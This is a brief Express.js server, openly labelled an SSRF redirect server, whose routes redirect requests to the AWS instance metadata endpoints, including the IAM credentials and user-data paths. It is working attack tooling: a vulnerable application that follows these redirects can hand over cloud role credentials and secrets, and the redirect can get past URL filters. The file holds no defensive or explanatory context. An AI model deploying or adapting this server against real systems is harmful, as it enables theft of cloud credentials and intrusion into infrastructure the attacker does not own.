const express = require("express");
const app = express();
const PORT = process.env.PORT || 10000;

const targets = {
  meta: "http://169.254.169.254/latest/meta-data/",
  iam: "http://169.254.169.254/latest/meta-data/iam/",
  userdata: "http://169.254.169.254/latest/user-data/"
};

app.get("/redirect-to/:type", (req, res) => {
  const target = targets[req.params.type];
  if (!target) return res.status(404).send("Not found");
  res.redirect(target); // fast redirect
});

app.listen(PORT, () => {
  console.log(`🔥 SSRF redirect server on http://localhost:${PORT}`);
});
